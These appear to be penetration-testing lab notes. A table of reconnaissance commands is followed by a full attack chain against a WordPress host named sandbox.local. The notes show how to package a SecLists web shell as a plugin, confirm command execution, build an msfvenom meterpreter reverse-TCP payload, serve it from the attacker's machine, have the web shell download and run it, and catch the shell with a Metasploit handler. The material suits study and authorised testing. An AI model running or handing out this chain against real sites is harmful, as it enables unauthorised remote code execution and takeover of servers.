| **Command** | **Description** |
| --------------|-------------------|
|`tree -L 1`|  Lists contents of current directory |
|`curl -s -X GET <url>`| Makes a GET request to a webserver and receives HTML source code of requested web page |
|`curl -I -X GET <url>`| Prints the response header of the GET request from the requested web page |
|`curl -X POST -d <data> <url>`| Sends a POST request with data to specific webserver |
|`wpscan --url <url> -e ap`| Scans specific WordPress application to enumerate plugins |
|`wpscan --url <url> -e u`| Scans specific WordPress application to enumerate users |
|`msfconsole`| Starts Metasploit Framework |
|`html2text`|  Converts redirected HTML output or files to easily readable output |
|`grep <pattern>`| Filters specific pattern in files or redirected output |
|`jq`| Transforms JSON input and streams of JSON entities |
|`man <tool>`| Man provides you with the manpage of the specific tool |

`wpscan --url sandbox.local --enumerate ap,at,cb,dbe`

`sudo apt install seclists`
`cd /usr/share/seclists/Web-Shells/WordPress`
files: plugin-shell.php, bypass-login.php
`sudo zip plugin-shell.zip plugin-shell.php`

upload plugin to wordpress site

`curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami` | verify command injection works
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=443 -f elf > shell.elf` | generate a payload to get shell
`sudo python3 -m http.server 80` | star python server on kali
`curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://10.11.0.4/shell.elf` | download msfvenom shell payload
`curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=chmod%20%2bx%20shell.elf` | modify permissions on file
`sudo msfconsole -q -x "use exploit/multi/handler;\
set PAYLOAD linux/x86/meterpreter/reverse_tcp;\
set LHOST 10.11.0.4;\
set LPORT 443;\
run"`
`curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=./shell.elf` | execute reverse shell payload